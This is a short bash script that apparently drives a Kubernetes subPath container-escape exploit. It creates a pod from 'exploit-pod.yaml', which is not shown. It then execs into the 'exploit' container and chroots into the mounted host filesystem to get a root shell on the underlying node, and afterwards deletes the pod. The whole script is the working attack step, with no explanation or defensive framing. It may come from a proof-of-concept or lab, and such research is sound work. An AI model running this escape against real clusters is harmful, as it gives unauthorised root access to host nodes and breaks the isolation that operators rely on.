#!/bin/bash

echo "Create the pod..."
kubectl create -f exploit-pod.yaml
echo "Pod created.  Sleeping a bit to allow them to come up"
sleep 5
echo "Execing into the container with a root shell on the underlying host"
kubectl exec -it subpath -c exploit -- chroot /rootfs /bin/bash
echo "Cleaning up"
kubectl delete -f exploit-pod.yaml
